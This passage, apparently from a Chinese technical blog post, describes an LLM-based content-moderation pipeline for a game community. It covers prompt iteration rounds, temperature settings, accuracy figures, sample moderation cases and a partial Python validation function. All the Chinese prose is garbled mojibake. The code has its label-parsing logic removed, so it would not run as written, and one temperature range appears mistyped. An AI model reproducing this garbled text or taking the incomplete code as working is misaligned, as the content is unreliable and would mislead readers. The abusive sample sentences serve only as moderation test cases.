<li>è¿›å…¥<strong>æ”¶ç›Šé€’å‡åŒºé—´</strong>çš„èµ·ç‚¹ï¼Œå‡†ç¡®ç‡ä¸ç¨³å®šæ€§åŸºæœ¬æ”¶æ•›ã€‚</li>
<li>ä¸ 10 è½®ç›¸æ¯”ï¼Œ<strong>å¢ç›Šä¸æ˜æ˜¾</strong>ï¼Œä½†è®¡ç®—/æ—¶é—´æˆæœ¬æ˜¾è‘—æ›´ä½ã€‚</li>
</ul>
</li>
<li>
<p><strong>10</strong> <strong>è½®ï¼šä¸ 5</strong> <strong>è½®æ¥è¿‘</strong></p>
<ul>
<li>æŒ‡æ ‡æ¥è¿‘ 5 è½®ï¼Œ<strong>å·®å¼‚åœ¨ç»Ÿè®¡è¯¯å·®èŒƒå›´å†…</strong>ã€‚</li>
<li>æˆæœ¬çº¦ä¸º 5 è½®çš„ 2 å€ï¼ˆæ¨ç†è´¹ç”¨ã€æ—¶é—´å ç”¨ã€å¹¶å‘ç®¡ç†ï¼‰ã€‚</li>
</ul>
</li>
<li>
<p><strong>10</strong> <strong>è½®ä»¥ä¸Šï¼šå¯èƒ½å‡ºç°è´Ÿé¢å½±å“</strong></p>
<ul>
<li>è¿‡æ‹Ÿåˆäºâ€œç‰¹å®šå®¡æ ¸å‘˜å£å¾„/ç‰¹å®šæ ·æœ¬ç°‡â€ï¼Œæç¤ºè¯<strong>å˜çª„</strong>ã€‚</li>
<li>å¯¹è·¨å¤©ã€è·¨å®¡æ ¸å‘˜ã€è·¨è¯­ç§çš„æ³›åŒ–èƒ½åŠ›<strong>ç•¥æœ‰ä¸‹é™</strong>ã€‚</li>
</ul>
</li>
</ul>
<p><strong>ç»“è®º</strong>ï¼šåœ¨æˆæœ¬â€”æ”¶ç›Šçš„ç»¼åˆè€ƒé‡ä¸‹ï¼Œæˆ‘ä»¬é€‰æ‹©Â <strong>5</strong> <strong>è½®</strong>Â ä½œä¸ºç”Ÿäº§å»ºè®®ï¼Œå¹¶ç»™å‡º<strong>å®è·µåŒºé—´</strong> <strong>5â€“8</strong> <strong>è½®</strong>ï¼ˆ8 è½®ç”¨äºæ›´ä¸¥æ ¼çš„åœºæ™¯/å…³é”®ä¸Šçº¿å‰çš„ç¨³å¥æ€§æ ¡éªŒï¼‰ã€‚</p>
<h3 data-id="heading-9">ç‰ˆæœ¬å¯¹æ¯”</h3>





















































<table><thead><tr><th/><th>ç‰ˆæœ¬</th><th>è½®æ¬¡</th><th>æ ¸å¿ƒæ”¹åŠ¨</th><th>æ•ˆæœè§‚å¯Ÿ</th><th>ä¸»è¦é—®é¢˜</th></tr></thead><tbody><tr><td>1</td><td>v1</td><td>1</td><td>å†·å¯åŠ¨æç¤ºè¯ï¼Œç›´æ¥åˆ†ç±»</td><td>åŸºçº¿ 72%</td><td>ç°è‰²è¯­å¢ƒè¯¯åˆ¤ã€å¤šè¯­è¨€ä¸ç¨³</td></tr><tr><td>2</td><td>v2</td><td>3</td><td>åŠ è¯­è¨€è¯†åˆ«ã€å…³é”®è¯æå–</td><td>~77â€“79%</td><td>ä»æœ‰æ¬ æ‹Ÿåˆè¿¹è±¡</td></tr><tr><td>3</td><td>v3</td><td>5</td><td>ReAct æ¨ç†é“¾æ¡æ”¶æ•›ã€åˆ†ç±»è¾¹ç•Œç²¾ç‚¼</td><td>81%</td><td>æ ‡æ³¨å™ªå£°æˆä¸ºä¸»é™å› ç´ </td></tr><tr><td>4</td><td>v4</td><td>8</td><td>è§„åˆ™ç²¾ä¿®ã€è¾“å‡ºä¸€è‡´æ€§å¢å¼º</td><td>~81%Â±</td><td>æå‡æ¥è¿‘å™ªå£°å¤©èŠ±æ¿</td></tr><tr><td>5</td><td>v5</td><td>10+</td><td>æ›´ç»†ç²’åº¦è§„åˆ™</td><td><strong>æ”¶ç›Šä¸å¢åé™</strong></td><td>è¿‡æ‹Ÿåˆé£é™©ä¸Šå‡ï¼Œæç¤ºè¯ä¼šè¿‡äºå…·è±¡åŒ–</td></tr></tbody></table>
<h2 data-id="heading-10">Temperature è°ƒå‚ç»éªŒ</h2>
<p>åœ¨æˆ‘ä»¬åå¤è°ƒæç¤ºè¯çš„è¿‡ç¨‹ä¸­ï¼Œå‘ç°Â <strong>temperature</strong> <strong>å‚æ•°</strong>Â å¯¹ç»“æœå½±å“è¾ƒå¤§ã€‚</p>
<ul>
<li>
<p><strong>åœ¨è°ƒè¯•å’Œå®éªŒé˜¶æ®µ</strong><br/>
æˆ‘ä»¬ä¼šæŠŠ temperature å¼€å¾—æ¯”è¾ƒé«˜ï¼Œå¤§æ¦‚åœ¨Â <strong>8â€“1.0</strong>ã€‚è¿™æ ·æ¨¡å‹ä¼šæ›´â€œæ´»è·ƒâ€ï¼Œèƒ½ä»ä¸åŒè§’åº¦å»ç†è§£æ–‡æœ¬ã€‚æ¯”å¦‚ï¼š</p>
<ul>
<li>äºŒæ¬¡å…ƒæ¢—ã€è®½åˆºè¯è¯­ã€è·¨è¯­ç§ç”šè‡³å¤¹æ‚ emoji çš„å†…å®¹ï¼Œé«˜ temperature ä¸‹æ¨¡å‹èƒ½ç»™å‡ºæ›´å¤šè§£é‡Šï¼›</li>
<li>è¿™å¯¹æˆ‘ä»¬æ¥è¯´å¾ˆæœ‰å¸®åŠ©ï¼Œå¯ä»¥æš´éœ²æç¤ºè¯é‡Œæ²¡è€ƒè™‘åˆ°çš„è¾¹è§’æƒ…å†µï¼Œæ–¹ä¾¿æˆ‘ä»¬å¿«é€Ÿæ”¹è¿›ã€‚</li>
</ul>
</li>
<li>
<p><strong>åœ¨çœŸæ­£ä¸Šçº¿çš„æ—¶å€™</strong><br/>
æˆ‘ä»¬æŠŠ temperature æ‹‰åˆ°Â <strong>0â€“0.1</strong>ã€‚</p>
<ul>
<li>è¿™æ ·æ¨¡å‹è¾“å‡ºä¼šå°½é‡å›ºå®šï¼Œä¸ä¼šåŒä¸€æ¡å†…å®¹å‰åç»™å‡ºä¸ä¸€æ ·çš„ç»“æœï¼›</li>
<li>å¯¹å®¡æ ¸ä¸šåŠ¡æ¥è¯´ï¼Œ<strong>ç¨³å®šå’Œå¯è§£é‡Š</strong>æ¯”â€œæœ‰åˆ›é€ åŠ›â€è¦é‡è¦å¾—å¤šã€‚</li>
</ul>
</li>
</ul>
<p>æ‰€ä»¥æˆ‘ä»¬çš„åšæ³•æ˜¯ï¼š<strong>è°ƒè¯•é˜¶æ®µé«˜</strong> <strong>temperature</strong> <strong>ï¼Œç”Ÿäº§ç¯å¢ƒä½ temperature</strong>ï¼Œæ—¢èƒ½æ¢ç´¢é—®é¢˜ï¼Œä¹Ÿèƒ½ä¿è¯ä¸Šçº¿ç¨³å®šã€‚</p>
<h2 data-id="heading-11">å®éªŒç»“æœï¼ˆå£å¾„ä¸å™ªå£°è¯´æ˜ï¼‰</h2>
<ul>
<li><strong>æ•´ä½“å‡†ç¡®ç‡</strong>ï¼š<strong>81%</strong></li>
<li><strong>æ­£å‘å¬å›å‡†ç¡®ç‡ï¼ˆåˆè§„åˆ¤å®šï¼‰</strong> ï¼š<strong>76%</strong></li>
<li><strong>è´Ÿå‘å¬å›å‡†ç¡®ç‡ï¼ˆè¿è§„åˆ¤å®šï¼‰</strong> ï¼š<strong>90%</strong></li>
</ul>
<p><strong>è¯„ä¼°å£å¾„ä¸æ•°æ®å™ªå£°ï¼š</strong></p>
<ul>
<li>åŸºå‡†ä¸ºå®¢æˆ·æä¾›çš„<strong>äººå·¥å®¡æ ¸æ•°æ®</strong>ï¼›å¤šäººã€åˆ†å¤šæ—¥å®Œæˆï¼Œ<strong>æœªå»ºç«‹åŒç›²å¤æ ¸</strong>ï¼Œå£å¾„å­˜åœ¨<strong>å¤©ç„¶ä¸ä¸€è‡´</strong>ã€‚</li>
<li>å› æ­¤ 81% çš„ä¸€è‡´æ€§ï¼Œ<strong>å·²ç»æ¥è¿‘ç”šè‡³å¯èƒ½è¶…è¿‡</strong>å¤šäººäººå·¥çš„ç¨³å®šæ°´å¹³ã€‚</li>
<li>åœ¨å¤šè¯­è¨€ä¸ç°è‰²è¯­å¢ƒï¼ˆç©æ¢—ã€åè®½ï¼‰ä¸Šï¼Œ<strong>ReAct</strong> <strong>æç¤ºè¯</strong>æ˜¾è‘—é™ä½äº†éšæœºè¯¯åˆ¤ï¼Œå¹¶æå‡äº†è·¨è¯­è¨€ä¸€è‡´æ€§ã€‚</li>
</ul>
<h3 data-id="heading-12">ä»£è¡¨æ€§æ¡ˆä¾‹ï¼ˆæ¨¡æ‹ŸçœŸå®æ•°æ®ï¼‰</h3>








































<table><thead><tr><th/><th>æ–‡æœ¬ï¼ˆèŠ‚é€‰ï¼‰</th><th>äººå·¥æ ‡æ³¨</th><th>åŸºçº¿æ¨¡å‹</th><th>ReAct æç¤ºè¯</th></tr></thead><tbody><tr><td>1</td><td>â€œYou are stupid, I hate you.â€</td><td>ä»‡æ¨è¨€è®º</td><td>Pass âŒ</td><td>Reject âœ…ï¼ˆHate Speechï¼‰</td></tr><tr><td>2</td><td>â€œThis waifu is so hot omg ğŸ”¥â€</td><td>åˆè§„ï¼ˆäºŒæ¬¡å…ƒè¯­å¢ƒï¼‰</td><td>Reject âŒ</td><td>Pass âœ…</td></tr><tr><td>3</td><td>â€œThe devs are scammers, I hope they burn.â€</td><td>ä»‡æ¨è¨€è®º</td><td>Reject âœ…</td><td>Reject âœ…ï¼ˆHate Speechï¼‰</td></tr><tr><td>4</td><td>â€œHelloâ€</td><td/><td>Passâœ…</td><td/></tr></tbody></table>
<h2 data-id="heading-13">å·¥ç¨‹å®ç°è¦ç‚¹</h2>
<h3 data-id="heading-14">æ ¸å¿ƒä»£ç </h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">process_file_validation</span>(<span class="hljs-params">file_path, prompt_template, client, model_id, temperature, max_tokens, logger</span>):
    <span class="hljs-string">"""Process a single file for validation and return results"""</span>
    file_name = os.path.basename(file_path)
    
    logger.info(<span class="hljs-string">f"Validating file: <span class="hljs-subst">{file_name}</span>"</span>)
    
    <span class="hljs-keyword">try</span>:
        df = pd.read_excel(file_path, engine=<span class="hljs-string">'openpyxl'</span>)
        
        <span class="hljs-comment"># Processing Excel data</span>
        <span class="hljs-comment"># ...</span>
        
        results = []
        
        <span class="hljs-comment"># Counters for detailed metrics</span>
        metrics = {
            <span class="hljs-string">"total"</span>: <span class="hljs-built_in">len</span>(data),
            <span class="hljs-string">"pass_samples"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"reject_samples"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"pass_correct"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"reject_correct"</span>: <span class="hljs-number">0</span>,
            <span class="hljs-string">"category_metrics"</span>: defaultdict(<span class="hljs-keyword">lambda</span>: {<span class="hljs-string">"total"</span>: <span class="hljs-number">0</span>, <span class="hljs-string">"correct"</span>: <span class="hljs-number">0</span>})
        }
        
        <span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> tqdm(data, desc=<span class="hljs-string">f"Processing <span class="hljs-subst">{file_name}</span>"</span>):
            <span class="hljs-comment"># ...</span>
            <span class="hljs-comment"># Format the prompt with the current text</span>
            prompt = prompt_template.<span class="hljs-built_in">format</span>(text=text)
            
            <span class="hljs-comment"># Get model response</span>
            response = invoke_claude(client, prompt, model_id, temperature, max_tokens, logger)
            
            <span class="hljs-comment"># Extract prediction (0 or 1) from response</span>
            <span class="hljs-keyword">if</span> response:
                <span class="hljs-comment"># Look for Pass/Reject indicators in the response</span>
                lower_response = response.lower()
                
                <span class="hljs-comment"># Check for explicit "Pass" or "Reject" in the response</span>

                <span class="hljs-comment"># Check for numeric indicators</span>
                
                <span class="hljs-comment"># Default to Reject if unclear</span>
                    
                is_correct = pred_label == true_label
                <span class="hljs-keyword">if</span> is_correct:
                    <span class="hljs-keyword">if</span> true_label == <span class="hljs-number">1</span>:
                        metrics[<span class="hljs-string">"pass_correct"</span>] += <span class="hljs-number">1</span>
                    <span class="hljs-keyword">else</span>:
                        metrics[<span class="hljs-string">"reject_correct"</span>] += <span class="hljs-number">1</span>
                        metrics[<span class="hljs-string">"category_metrics"</span>][category][<span class="hljs-string">"correct"</span>] += <span class="hljs-number">1</span>
                    
                results.append({
                    <span class="hljs-string">"text"</span>: text,
                    <span class="hljs-string">"true_label"</span>: true_label,
                    <span class="hljs-string">"pred_label"</span>: pred_label,
                    <span class="hljs-string">"is_correct"</span>: is_correct,
                    <span class="hljs-string">"response"</span>: response,
                    <span class="hljs-string">"category"</span>: category,
                    <span class="hljs-string">"source_file"</span>: file_name
                })
            
            <span class="hljs-comment"># Add a small delay to avoid rate limiting</span>
            time.sleep(<span class="hljs-number">0.5</span>)
        
        <span class="hljs-comment"># Calculate metrics</span>
        <span class="hljs-comment"># ...</span>
        
        logger.info(<span class="hljs-string">f"Completed <span class="hljs-subst">{file_name}</span>: Accuracy=<span class="hljs-subst">{metrics[<span class="hljs-string">'accuracy'</span>]:<span class="hljs-number">.4</span>f}</span>, "</span>
                   <span class="hljs-string">f"Pass=<span class="hljs-subst">{metrics[<span class="hljs-string">'pass_accuracy'</span>]:<span class="hljs-number">.4</span>f}</span>, Reject=<span class="hljs-subst">{metrics[<span class="hljs-string">'reject_accuracy'</span>]:<span class="hljs-number">.4</span>f}</span>"</span>)
        
        <span class="hljs-keyword">return</span> file_name, results, metrics
        
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        logger.error(<span class="hljs-string">f"Error processing file <span class="hljs-subst">{file_path}</span>: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> file_name, [], {<span class="hljs-string">"error"</span>: <span class="hljs-built_in">str</span>(e)}
</code></pre>
<h3 data-id="heading-15">1) æ—¥å¿—ä¸å¯è¿½æº¯æ€§</h3>
<ul>
<li>
<p><strong>ç›®çš„</strong>ï¼šè®°å½•æ¯ä¸ªæ–‡ä»¶ã€æ¯æ¡æ ·æœ¬çš„åˆ¤å®šä¸æŒ‡æ ‡ï¼Œæ”¯æ’‘é—®é¢˜å›æº¯ã€‚</p>
</li>
<li>
<p><strong>å®è·µè¦ç‚¹</strong>ï¼š</p>
<ul>
<li>æ–‡ä»¶ + æ§åˆ¶å°åŒé€šé“æ—¥å¿—ï¼›</li>
<li>å…³é”®ä¿¡æ¯ç»“æ„åŒ–è¾“å‡ºï¼ˆaccuracyã€pass/rejectã€category æŒ‡æ ‡ï¼‰ï¼›</li>
<li>æ¯è½®/æ¯ç‰ˆæœ¬ç”Ÿæˆç‹¬ç«‹ log æ–‡ä»¶ï¼Œä¾¿äºå¯¹æ¯”ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-16">2) æ•°æ®è£…è½½ä¸å¤šæ–‡ä»¶æ‰¹å¤„ç†</h3>
<ul>
<li>
<p><strong>Excel</strong> <strong>åˆ—ä½å¤„ç†</strong>ï¼šæ–‡æœ¬ã€æ ‡ç­¾åˆ—æå–ã€‚</p>
</li>
<li>
<p><strong>è¦ç‚¹</strong>ï¼š</p>
<ul>
<li><strong>ç»Ÿä¸€ label</strong> <strong>å£å¾„</strong>ï¼š<code>Pass â†’ 1 / Reject â†’ 0</code>ï¼›</li>
<li><strong>ç±»åˆ«ç²¾åº¦</strong>ï¼šå¯¹Â <code>Reject</code>Â çš„ç±»åˆ«è¿›è¡Œ<strong>å•ç‹¬ç»Ÿè®¡</strong>ï¼Œä¾¿äºå‘ç°â€œå¼±ç±»â€ã€‚</li>
</ul>
</li>
</ul>
<h3 data-id="heading-17">3) å¤§æ¨¡å‹è°ƒç”¨ä¸æ¨ç†å‚æ•°ï¼ˆä½¿ç”¨botocoreè°ƒç”¨Bedrockï¼‰</h3>
<ul>
<li><strong>é»˜è®¤å‚æ•°</strong>ï¼š<code>temperature=0.0</code>ã€<code>max_tokens=1000</code>ï¼Œç¡®ä¿<strong>å¯é‡å¤ä¸ç¨³å®šè¾“å‡ºï¼Œ</strong> <code>max_tokens</code>è¿‡å¤§å¯¹æ•ˆæœå½±å“æœ‰é™;</li>
<li><strong>è¶…æ—¶/</strong> <strong>é‡è¯•</strong>ï¼š<code>botocore.config.Config</code>ä¸­è®¾ç½®<code>connect_timeout/read_timeout/retries</code>ï¼›</li>
</ul>
<h3 data-id="heading-18">4) æç¤ºè¯æ¨¡æ¿ä¸å ä½</h3>
<ul>
<li>é€šè¿‡<code>prompt_template.format(text=...)</code>Â æ³¨å…¥æ ·æœ¬æ­£æ–‡ã€‚</li>
<li><strong>å»ºè®®</strong>ï¼šæ¨¡æ¿å†…ç»Ÿä¸€çº¦æŸ<strong>å”¯ä¸€</strong> <strong>JSON</strong> <strong>è¾“å‡º</strong>ï¼Œä¾¿äºè§£æï¼›è¾“å‡ºå‰ç½® ReAct æ­¥éª¤ï¼ˆè¯­è¨€è¯†åˆ«ã€å…³é”®è¯æå–ã€ç±»åˆ«åŒ¹é…ã€æœ€ç»ˆåˆ¤å®šï¼‰ã€‚</li>
</ul>
<h3 data-id="heading-19">5) å¹¶å‘éªŒè¯ä¸èŠ‚æµ</h3>
<ul>
<li><strong>å¤šæ–‡ä»¶å¹¶è¡Œ</strong>ï¼š<code>ThreadPoolExecutor</code>Â æŒ‰æ–‡ä»¶ç²’åº¦å¹¶å‘ï¼›</li>
<li><strong>é€Ÿç‡æ§åˆ¶</strong>ï¼š<code>time.sleep(0.5)</code>Â åšåŸºç¡€èŠ‚æµï¼Œé¿å…é™æµï¼Œæ³¨æ„æ‚¨Amazon Web Serviceè´¦å·å†…Quotaï¼›</li>
</ul>
<h3 data-id="heading-20">6) è¯„ä¼°ä¸æŠ¥è¡¨</h3>
<ul>
<li>
<p>è¾“å‡ºå››ä¸ª Sheetï¼š<code>Results / Overall Metrics / File Metrics / Category Metrics</code>Â +Â <code>Prompt</code>ã€‚</p>
</li>
<li>
<p><strong>å¥½å¤„</strong>ï¼š</p>
<ul>
<li><code>Category Metrics</code>Â èƒ½å¿«é€Ÿå®šä½<strong>è–„å¼±ç±»åˆ«</strong>ï¼›</li>
<li><code>Prompt</code>Â ç•™å­˜ä½¿<strong>ç‰ˆæœ¬å¯å¤ç°</strong>ï¼›</li>
<li>ç»“åˆæ—¥å¿—å¿«é€Ÿå›æ”¾å¼‚å¸¸æ ·æœ¬ã€‚</li>
</ul>
</li>
</ul>
<p><strong>è¯„ä¼°å£å¾„</strong>ï¼šç»Ÿä¸€ä½¿ç”¨â€œä¸äººå·¥æ ‡æ³¨çš„ä¸€è‡´æ€§â€ä¸ºä¸»æŒ‡æ ‡ï¼ˆOverall/Pass/Reject accuracy + Category accuracyï¼‰ï¼Œå¹¶åœ¨æ–‡ä¸­<strong>æ˜¾å¼å£°æ˜æ ‡æ³¨å™ªå£°</strong>ä¸â€œå¤šå®¡æ ¸å‘˜/å¤šæ—¥/æœªå¤æ ¸â€çš„ç°å®çº¦æŸã€‚</p>
<h2 data-id="heading-21">ç»éªŒæ€»ç»“ï¼ˆé’ˆå¯¹è½®æ•°é€‰æ‹©ä¸æˆæœ¬ï¼‰</h2>
<ul>
<li>
<p><strong>å»ºè®®è½®æ•°</strong>ï¼š<strong>5â€“8</strong> <strong>è½®</strong>ï¼›5 è½®ç”¨äºå¤§å¤šæ•°ç”Ÿäº§åœºæ™¯ï¼Œ8 è½®ç”¨äºä¸Šçº¿å‰ç¨³å¥æ€§æ ¡éªŒã€‚</p>
</li>
<li>
<p><strong>é¿å…è¿‡æ‹Ÿåˆ</strong>ï¼š10 è½®ä»¥ä¸Šå®¹æ˜“å¯¹æŸäº›å®¡æ ¸å‘˜å£å¾„æˆ–å°æ ·æœ¬ç°‡è¿‡æ‹Ÿåˆï¼Œæ³›åŒ–å˜å·®ã€‚</p>
</li>
<li>
<p><strong>æˆæœ¬ä¼˜åŒ–</strong>ï¼š</p>
<ul>
<li>ä¸²å¹¶ç»“åˆï¼šæ–‡ä»¶çº§å¹¶è¡Œ + æ ·æœ¬çº§èŠ‚æµï¼›</li>
<li>å›ºå®šÂ <code>temperature</code>ï¼Œä¿è¯ä¸€è‡´æ€§ï¼Œå‡å°‘â€œè¿”å·¥è½®â€ï¼›</li>
<li>å¯¹ç±»åˆ«<strong>åˆ†å±‚æŠ½æ ·</strong>åšå°é›†è¯„ä¼°ï¼Œä¼˜å…ˆä¿®â€œå¼±ç±»â€ï¼Œå†å…¨é‡å›å½’ã€‚</li>
<li>åœ¨æœ€ç»ˆå·¥ç¨‹åŒ–å®æ–½æ—¶ï¼Œå¯ä»¥å°†æç¤ºè¯æ”¾åˆ°system promptä¸­ï¼ŒåŒæ—¶å¼€å¯cacheï¼Œä»¥é™ä½æˆæœ¬ã€‚</li>
</ul>
</li>
<li>
<p><strong>JSON</strong> <strong>ä»…è¾“å‡ºä¸è§£æå¥å£®æ€§</strong></p>
<ul>
<li>å¼ºè°ƒè¾“å‡ºæ ¼å¼çš„è§„èŒƒåŒ–ï¼Œé™ä½å¯¹è¾“å‡ºç»“æœçš„ä¸ç»Ÿä¸€å¢åŠ ç”Ÿäº§ç³»ç»Ÿçš„ä¸ç¡®å®šæ€§ã€‚</li>
<li>éƒ¨åˆ†æç¤ºè¯</li>
</ul>
</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F472b07b9fcf2c2451e8781e944bf5f77cd8457c8%2F2025%2F09%2F29%2Fcommunities-3.jpg" target="_blank" title="https://d2908q01vomqb2.cloudfront.net/472b07b9fcf2c2451e8781e944bf5f77cd8457c8/2025/09/29/communities-3.jpg" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ce09ff6490fc4094bb656ab04d2d485c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763948&amp;x-signature=wSwcENFAjfgJ9IWsuVIxTsR9fGM%3D" alt="" loading="lazy"/></a></p>
<ul>
<li>è¾“å‡º</li>
</ul>
<p><a href="https://link.juejin.cn?target=https%3A%2F%2Fd2908q01vomqb2.cloudfront.net%2F472b07b9fcf2c2451e8781e944bf5f77cd8457c8%2F2025%2F09%2F29%2Fcommunities-4.png" target="_blank" title="https://d2908q01vomqb2.cloudfront.net/472b07b9fcf2c2451e8781e944bf5f77cd8457c8/2025/09/29/communities-4.png" ref="nofollow noopener noreferrer"><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b8e04bd15b444a48aad8fe053f93961a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5Lqa6ams6YCK5LqR5byA5Y-R6ICF:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765763948&amp;x-signature=sljqwQ4T9NXdLfOgfmw%2Bx2p%2F5Rg%3D" alt="" loading="lazy"/></a></p>
<h2 data-id="heading-22">è½åœ°ç»éªŒ</h2>
<p>åœ¨æ•´ä¸ªé¡¹ç›®è½åœ°çš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬ç§¯ç´¯äº†å‡ æ¡å…³é”®ç»éªŒï¼š</p>
<ol>
<li><strong>æç¤ºè¯å¿…é¡»è´´åˆä¸šåŠ¡æ ‡æ³¨ä½“ç³»:</strong> é€šç”¨çš„â€œå†…å®¹å®‰å…¨â€æç¤ºè¯è¿œè¿œä¸å¤Ÿã€‚åªæœ‰ç»“åˆå®¢æˆ·çš„ 10 ç±»è¿è§„åˆ†ç±»ï¼Œå¹¶ä¸æ–­å¯¹ç…§äººå·¥å®¡æ ¸æ ·æœ¬ä¿®æ­£ï¼Œæ‰èƒ½è®©æ¨¡å‹è¾“å‡ºç»“æœå’Œä¸šåŠ¡å£å¾„ä¿æŒä¸€è‡´ã€‚</li>
<li><strong>ReAct</strong> <strong>æ¡†æ¶å¸¦æ¥äº†å¯è§£é‡Šæ€§:</strong> æ¨¡å‹å…ˆè¿›è¡Œâ€œæ€è€ƒâ€ï¼Œå†ç»™å‡ºâ€œè¡ŒåŠ¨â€ï¼Œè®©æ¯ä¸€æ­¥é€»è¾‘æ›´åŠ é€æ˜ã€‚æˆ‘ä»¬å¯ä»¥å±•ç¤ºæ¨¡å‹çš„æ¨ç†é€»è¾‘ï¼ˆè¯­è¨€è¯†åˆ«ã€å…³é”®è¯æå–ã€ç±»åˆ«åŒ¹é…ï¼‰ï¼Œå¢å¼ºäº†å®¡æ ¸ç»“è®ºçš„å¯ä¿¡åº¦ã€‚</li>
<li><strong>æ•°æ®è´¨é‡æ˜¯ä¸Šé™ï¼Œæç¤ºè¯ä¼˜åŒ–æ˜¯ä¸‹é™:</strong> æˆ‘ä»¬ä½¿ç”¨çš„äººå·¥å®¡æ ¸æ•°æ®å­˜åœ¨å¤šäººã€åˆ†å¤šæ—¥å®Œæˆã€ç¼ºä¹å¤æ ¸ç­‰é—®é¢˜ï¼Œå¯¼è‡´æ ‡æ³¨ç»“æœæœ¬èº«å¸¦æœ‰å™ªå£°ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ¨¡å‹çš„å‡†ç¡®ç‡â€œå¤©èŠ±æ¿â€å°±ä¼šå—åˆ°å½±å“ã€‚æ¢å¥è¯è¯´ï¼Œæç¤ºè¯ä¼˜åŒ–èƒ½é€¼è¿‘äººå·¥æ°´å¹³ï¼Œä½†è¦è¿›ä¸€æ­¥çªç ´ï¼Œè¿˜éœ€è¦å®¢æˆ·æ”¹å–„æ•°æ®æ ‡æ³¨æµç¨‹ã€‚</li>
<li><strong>æˆæœ¬ä¸æ•ˆæœçš„æƒè¡¡:</strong> æˆ‘ä»¬åœ¨å®éªŒä¸­éªŒè¯äº† 3ã€5ã€10 è½®è¿­ä»£çš„å·®å¼‚ï¼Œæœ€ç»ˆé€‰æ‹© 5 è½®ä½œä¸ºæœ€ä¼˜ç‚¹ã€‚åŒæ ·åœ°ï¼Œtemperature å‚æ•°åœ¨è°ƒä¼˜é˜¶æ®µè®¾ç½®é«˜å€¼ï¼Œåœ¨ä¸Šçº¿é˜¶æ®µé”å®šä½å€¼ï¼Œä¹Ÿæ˜¯å¹³è¡¡åˆ›é€ æ€§ä¸ç¨³å®šæ€§çš„å·¥ç¨‹å®è·µã€‚</li>
</ol>
<h2 data-id="heading-23">æœªæ¥ä¼˜åŒ–æ–¹å‘</h2>
<ol>
<li>
<p><strong>è‡ªåŠ¨åŒ–æç¤ºè¯ä¼˜åŒ–</strong></p>
<ul>
<li>å¼•å…¥ AutoPromptã€RLHF ç­‰æ–¹æ³•ï¼Œè®©æç¤ºè¯è¿›åŒ–ä¸å†å®Œå…¨ä¾èµ–äººå·¥è¯•é”™ã€‚</li>
<li>åœ¨æ›´å¤šè¯­è¨€ã€æ›´å¤šè¯­å¢ƒä¸‹æŒç»­æ”¶æ•›ã€‚</li>
</ul>
</li>
<li>
<p><strong>æ›´ç»†ç²’åº¦çš„åˆ†ç±»ä¸æ ‡ç­¾</strong></p>
<ul>
<li>å®¢æˆ·çš„ 10 ç±»è¿è§„ç±»åˆ«æ˜¯ç¬¬ä¸€å±‚çº§ã€‚</li>
<li>åç»­å¯ä»¥æ‰©å±•å­ç±»åˆ«ï¼ˆå¦‚â€œä»‡æ¨è¨€è®º â†’ é’ˆå¯¹æ€§åˆ« / ç§æ— / èŒä¸šâ€ï¼‰ï¼Œæ»¡è¶³æ›´ç²¾ç»†åŒ–çš„å†…å®¹æ²»ç†éœ€æ±‚ã€‚</li>
</ul>
</li>
<li>
<p><strong>æˆæœ¬ä¼˜åŒ–</strong></p>
<ul>
<li>ä¼šç»“åˆBedrockçš„cacheç‰¹æ€§ï¼Œå¢åŠ å¯¹system promptã€user promptçš„cacheï¼Œåœ¨ä¿è¯å®¡æ ¸æ•ˆæœçš„æƒ…å†µä¸‹ï¼Œå°½å¯èƒ½ä¼˜åŒ–æˆæœ¬ã€‚</li>
<li>æˆæœ¬è¯¦æƒ…è¯·å‚é˜…Amazon Bedrockæˆæœ¬é¡µé¢ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Faws.amazon.com%2Fcn%2Fbedrock%2Fpricing%2F" target="_blank" title="https://aws.amazon.com/cn/bedrock/pricing/" ref="nofollow noopener noreferrer">aws.amazon.com/cn/bedrock/â€¦</a>ï¼‰ä¸Claudeæ¨¡å‹æˆæœ¬é¡µé¢ï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.claude.com%2Fzh-CN%2Fdocs%2Fabout-claude%2Fpricing" target="_blank" title="https://docs.claude.com/zh-CN/docs/about-claude/pricing" ref="nofollow noopener noreferrer">docs.claude.com/zh-CN/docs/â€¦</a>ï¼‰</li>
</ul>
</li>
</ol>
<h2 data-id="heading-24">ç»“è¯­</h2>
<p>ä»æœ€åˆçš„â€œè¯¯åˆ¤é¢‘å‘â€ï¼Œåˆ°æœ€ç»ˆå®ç°Â <strong>81%</strong> <strong>çš„æ•´ä½“å‡†ç¡®ç‡</strong>ï¼Œæˆ‘ä»¬é€šè¿‡Â <strong>æç¤ºè¯å·¥ç¨‹ + ReAct</strong> <strong>æ¡†æ¶ +</strong> <strong>å·¥ç¨‹åŒ–æ¶æ„</strong>ï¼Œå¸®åŠ©å®¢æˆ·æ„å»ºäº†ä¸€å¥—Â <strong>ç¨³å®šã€å¯è§‚æµ‹ã€å¯æ‰©å±•</strong>Â çš„æ¸¸æˆç¤¾åŒºå®¡æ ¸ç³»ç»Ÿã€‚</p>
